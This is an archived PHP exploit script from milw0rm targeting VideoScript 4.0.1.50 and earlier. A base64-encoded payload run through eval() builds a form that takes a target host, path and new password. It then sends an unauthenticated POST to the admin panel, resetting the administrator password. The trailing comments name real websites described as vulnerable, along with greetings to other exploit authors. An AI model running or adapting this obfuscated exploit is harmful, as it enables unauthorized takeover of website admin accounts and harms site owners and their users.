<?php
	/* 
	==============================================================================
						  _      _       _          _      _   _ 
						 / \    | |     | |        / \    | | | |
						/ _ \   | |     | |       / _ \   | |_| |
					       / ___ \  | |___  | |___   / ___ \  |  _  |
			       IN THE NAME OF /_/   \_\ |_____| |_____| /_/   \_\ |_| |_|
																 

	==============================================================================
						  ____   _  _     _   _    ___    _  __
						 / ___| | || |   | \ | |  / _ \  | |/ /
						| |  _  | || |_  |  \| | | | | | | ' / 
						| |_| | |__   _| | |\  | | |_| | | . \ 
						 \____|    |_|   |_| \_|  \___/  |_|\_\

	==============================================================================
		VideoScript <= 4.0.1.50 Admin Change Password Exploit
	==============================================================================

		[»] Script:             [ VideoScript <= 4.0.1.50 ]
		[»] Language:           [ PHP ]
		[»] Website:            [ http://videoscript.co.uk/ ]
		[»] Type:               [ Commercial ]
		[»] DOD:                [ 15.11.2008 ]
		[»] Founder.Coder:      [ G4N0K <mail.ganok[at]gmail.com> ]


	===[ XPL ]===
																					*/

error_reporting(E_ALL);
   $G4N0K = "JEc0TjBLID0gPDw8RU9HDQo9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09".
			"PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NCiAgICAgICAgICAgICAgICAg".
			"ICAgICBfICAgICAgXyAgICAgICBfICAgICAgICAgIF8gICAgICBfICAgXyANCiAgICAgICAgICAg".
			"ICAgICAgICAgIC8gXCAgICB8IHwgICAgIHwgfCAgICAgICAgLyBcICAgIHwgfCB8IHwNCiAgICAg".
			"ICAgICAgICAgICAgICAgLyBfIFwgICB8IHwgICAgIHwgfCAgICAgICAvIF8gXCAgIHwgfF98IHwN".
			"CiAgICAgICAgICAgICAgICAgICAvIF9fXyBcICB8IHxfX18gIHwgfF9fXyAgIC8gX19fIFwgIHwg".
			"IF8gIHwNCiAgIElOIFRIRSBOQU1FIE9GIC9fLyAgIFxfXCB8X19fX198IHxfX19fX3wgL18vICAg".
			"XF9cIHxffCB8X3wNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg".
			"ICAgICAgICAgICAgICAgICANCg0KPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09".
			"PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQogICAgICAgICAgICAg".
			"ICAgICAgICAgX19fXyAgIF8gIF8gICAgIF8gICBfICAgIF9fXyAgICBfICBfXw0KICAgICAgICAg".
			"ICAgICAgICAgICAgLyBfX198IHwgfHwgfCAgIHwgXCB8IHwgIC8gXyBcICB8IHwvIC8NCiAgICAg".
			"ICAgICAgICAgICAgICAgfCB8ICBfICB8IHx8IHxfICB8ICBcfCB8IHwgfCB8IHwgfCAnIC8gDQog".
			"ICAgICAgICAgICAgICAgICAgIHwgfF98IHwgfF9fICAgX3wgfCB8XCAgfCB8IHxffCB8IHwgLiBc".
			"IA0KICAgICAgICAgZVhwbG8hdCBCeSAgXF9fX198ICAgIHxffCAgIHxffCBcX3wgIFxfX18vICB8".
			"X3xcX1wNCg0KPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09".
			"PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQoJVmlkZW9TY3JpcHQgPD0gNC4wLjEuNTAg".
			"QWRtaW4gQ2hhbmdlIFBhc3N3b3JkIEV4cGxvaXQNCj09PT09PT09PT09PT09PT09PT09PT09PT09".
			"PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0KDQpF".
			"T0c7DQplY2hvICI8cHJlPiIuJEc0TjBLLiI8L3ByZT4iOw0KJEZPUk0gPSAiPEZPUk0gYWN0aW9u".
			"PVwiIi4kX1NFUlZFUlsiUEhQX1NFTEYiXS4iXCIgbWV0aG9kPVwiUE9TVFwiPiI7JEZPUk0uPSA8".
			"PDxGRkYNCiAgICA8UCBzdHlsZT0id2lkdGg6IDMwMHB4O2NsZWFyOiBsZWZ0O21hcmdpbjogMDtw".
			"YWRkaW5nOiA1cHggMCA4cHggMDtwYWRkaW5nLWxlZnQ6IDE1NXB4O2JvcmRlci10b3A6IDFweCBk".
			"YXNoZWQgZ3JheTsiPg0KICAgIDxMQUJFTCBzdHlsZT0iZm9udC13ZWlnaHQ6IGJvbGQ7ZmxvYXQ6".
			"IGxlZnQ7bWFyZ2luLWxlZnQ6IC0xNTVweDt3aWR0aDoxNTBweDsiIGZvcj0iTVNER05LIj4gV2Vi".
			"c2l0ZSA6Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5i".
			"c3A7Jm5ic3A7Jm5ic3A7aHR0cDovLzwvTEFCRUw+DQogICAgICAgICAgICAgIDxJTlBVVCBzdHls".
			"ZT0id2lkdGg6IDE4MHB4OyIgdHlwZT0idGV4dCIgbmFtZT0iTVNER05LIiBpZD0iTVNER05LIj48".
			"YnIgLz4NCiAgICA8TEFCRUwgc3R5bGU9ImZvbnQtd2VpZ2h0OiBib2xkO2Zsb2F0OiBsZWZ0O21h".
			"cmdpbi1sZWZ0OiAtMTU1cHg7d2lkdGg6MTUwcHg7IiBmb3I9IlBBVEgiPlBhdGg6ICggL3Njcmlw".
			"dC8gKTwvTEFCRUw+DQogICAgICAgICAgICAgIDxJTlBVVCBzdHlsZT0id2lkdGg6IDE4MHB4OyIg".
			"dHlwZT0idGV4dCIgbmFtZT0iUEFUSCIgaWQ9IlBBVEgiIHZhbHVlPSIvIj48QlI+DQogICAgPFAg".
			"c3R5bGU9IndpZHRoOiAzMDBweDtjbGVhcjogbGVmdDttYXJnaW46IDA7cGFkZGluZzogNXB4IDAg".
			"OHB4IDA7cGFkZGluZy1sZWZ0OiAxNTVweDtib3JkZXItdG9wOiAxcHggZGFzaGVkIGdyYXk7Ij4N".
			"Cgk8TEFCRUwgc3R5bGU9ImZvbnQtd2VpZ2h0OiBib2xkO2Zsb2F0OiBsZWZ0O21hcmdpbi1sZWZ0".
			"OiAtMTU1cHg7d2lkdGg6MTUwcHg7IiBmb3I9Im5wdyI+IE5ldyBQYXNzd29yZCA6IDwvTEFCRUw+".
			"DQogICAgICAgICAgICAgIDxJTlBVVCBzdHlsZT0id2lkdGg6IDE4MHB4OyIgdHlwZT0idGV4dCIg".
			"bmFtZT0ibnB3IiBpZD0ibnB3Ij48QlI+DQoJPFAgc3R5bGU9IndpZHRoOiAzMDBweDtjbGVhcjog".
			"bGVmdDttYXJnaW46IDA7cGFkZGluZzogNXB4IDAgOHB4IDA7cGFkZGluZy1sZWZ0OiAxNTVweDti".
			"b3JkZXItdG9wOiAxcHggZGFzaGVkIGdyYXk7Ij4NCiAgICA8SU5QVVQgdHlwZT0ic3VibWl0IiBu".
			"YW1lPSJzdWJtaXQiIHZhbHVlPSJDaGFuZ2UgaXQhIj4gPElOUFVUIHR5cGU9InJlc2V0Ij4NCiAg".
			"ICA8L1A+DQogPC9GT1JNPg0KRkZGOw0KaWYgKGlzc2V0KCRfUE9TVFsnc3VibWl0J10pICYmIGlz".
			"c2V0KCRfUE9TVFsiTVNER05LIl0pICYmICFlbXB0eSgkX1BPU1RbIk1TREdOSyJdKSAmJiBpc3Nl".
			"dCgkX1BPU1RbJ25wdyddKSAmJiAhZW1wdHkoJF9QT1NUWyducHcnXSkgJiYgaXNzZXQoJF9QT1NU".
			"WyJQQVRIIl0pICYmICFlbXB0eSgkX1BPU1RbIlBBVEgiXSkpIHskbmV3X3B3ZCA9ICRfUE9TVFsn".
			"bnB3J107JHRlaGRhZGVfY2hhcnogPSBzdHJsZW4odXJsZW5jb2RlKCRuZXdfcHdkKSkgKiAyICsg".
			"Mjg7JGpva2U9IlBPU1QgIi4kX1BPU1RbIlBBVEgiXS4iYWRtaW4vY3AucGhwIEhUVFAvMS4xXHJc".
			"bkhvc3Q6ICIuJF9QT1NUWyJNU0RHTksiXS4iXHJcblVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChX".
			"aW5kb3dzOyBVOyBXaW5kb3dzIE5UIDUuMTsgZW4tVVM7IHJ2OjEuOSkgR2Vja28vMjAwODA1Mjkw".
			"NiBGaXJlZm94LzMuMFxyXG5LZWVwLUFsaXZlOiAzMDBcclxuQ29ubmVjdGlvbjoga2VlcC1hbGl2".
			"ZVxyXG5Db250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZFxyXG5D".
			"b250ZW50LUxlbmd0aDogIi4kdGVoZGFkZV9jaGFyei4iXHJcblxyXG5ucGFzcz0iLiRuZXdfcHdk".
			"LiImbnBhc3MxPSIuJG5ld19wd2QuIiZTdWJtaXQ9U3VibWl0XHJcbiI7JHJlcz0iIjskYXR0YWNr".
			"ID0gZnNvY2tvcGVuKCRfUE9TVFsiTVNER05LIl0sIjgwIiwkZXJybm8sICRlcnJzdHIsIDUwKTtp".
			"ZighJGF0dGFjayl7ZWNobygiPGJyIC8+V1RGLCBlcnIjOiAoJGVycm5vKS4kZXJyc3RyIik7cmV0".
			"dXJuO31lY2hvKCI8c3BhbiBzdHlsZT1cImZvbnQ6bm9ybWFsIDhwdCB0YWhvbWE7XCI+Jm5ic3A7".
			"Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7WytdIDxiPkNvbm5lY3RlZC4uLjxici8+PC9iPiZuYnNw".
			"OyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwO1srXSA8Yj5TZW5kaW5nIHJlcXVlc3QuLi48YnIvPjwv".
			"Yj4iKTtmd3JpdGUoJGF0dGFjaywkam9rZSk7d2hpbGUoIWZlb2YoJGF0dGFjaykpeyRyZXMuPWZn".
			"ZXRzKCRhdHRhY2spO31mY2xvc2UoJGF0dGFjayk7aWYgKHN0cmlzdHIoJHJlcywgInNhdmVkIikg".
			"fHwgc3RyaXN0cigkcmVzLCAiY2hhbmdlZCIpKXtlY2hvICImbmJzcDsmbmJzcDsmbmJzcDsmbmJz".
			"cDsmbmJzcDtbK108Yj4gRXhwbG9pdGVkICEgLCA8Zm9udCBjb2xvcj1cInJlZFwiPlBhc3N3b3Jk".
			"IGNoYW5nZWQuLi48L2I+PC9mb250PjxiciAvPiZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNw".
			"O1srXSAuLi48YnIgLz4mbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDtbK10gPGI+bmV3IHBh".
			"c3N3b3JkOjwvYj4gIi4kbmV3X3B3ZC4iPGJyIC8+Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5i".
			"c3A7WytdPGI+IGFkbWluIHBhbmVsOjwvYj4gaHR0cDovLyIuJF9QT1NUWyJNU0RHTksiXS4kX1BP".
			"U1RbIlBBVEgiXS4iYWRtaW4vPGJyIC8+PGJyIC8+PGJyIC8+PGJyIC8+PGJyIC8+PGJyIC8+PGJy".
			"IC8+PHNwYW4gc3R5bGU9XCJmb250Om5vcm1hbCA4cHQgdGFob21hO2NvbG9yOiNDQ0M7XCI+RXhw".
			"bG9pdCBCeSBHNE4wSy4uLjwvc3Bhbj4iO30gZWxzZSB7IGVjaG8gIiZuYnNwOyZuYnNwOyZuYnNw".
			"OyZuYnNwOyZuYnNwO1srXTxiPiBPb3BzICwgIHNyeSAsICA8dT5ub3QgVnVsbmVyYWJsZTwvdT4g".
			"LiAuIC4gITwvYj4iO31mbHVzaCgpO31lbHNle2VjaG8kRk9STTt9DQo=";
	eval(base64_decode($G4N0K));

/* ===[ LIVE ]===

	[»] www.xxxuploads.co.uk
	[»] www.gayphp.com
	[»] ...

	
===[ Greetz ]===

	[»] ALLAH
	[»] Tornado2800 <Tornado2800[at]gmail.com> // bedone in nemishe :D
	[»] Hussain-X <darkangel_g85[at]yahoo.com> // Jazakallah...
	[»] Str0ke //Hey Brotha keep rocking on ;)
	[»] Soudi-L0rd,Sakab...
	[»] SMN,MSD-KiD,AMD,MSN...

	Are ya looking for something that has not BUGz at all...!? I know it... It's The Holy Quran. [:-)
	ALLAH,forgimme...
 */
?>

# milw0rm.com [2008-11-17]
